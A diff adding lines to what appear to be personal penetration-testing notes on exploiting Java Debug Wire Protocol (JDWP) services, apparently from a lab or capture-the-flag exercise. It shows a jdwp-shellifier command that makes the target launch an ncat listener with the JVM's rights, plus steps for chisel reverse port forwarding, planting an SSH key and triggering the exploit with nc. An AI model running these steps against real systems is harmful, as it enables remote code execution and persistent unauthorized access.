@@ -20,3 +20,21 @@ $ python ./jdwp-shellifier.py -t my.target.ip -p 1234 --cmd "ncat -v -l -p 1234 
 ```
 
 This command will actually execute the process `ncat` with the specified argument with the rights given to the running JVM.
+
+---
+
+JDWP main server 8000
+JDWP trigger server 5000
+
+Create chisel port forward for both on separate instances
+
+[[Chisel Reverse Port Forward]]
+
+For 2nd session, add SSH key
+
+[[SSH Authorized Keys]]
+
+Send request to port 5000 to trigger
+```
+nc -nv 127.0.0.1 5000
+```
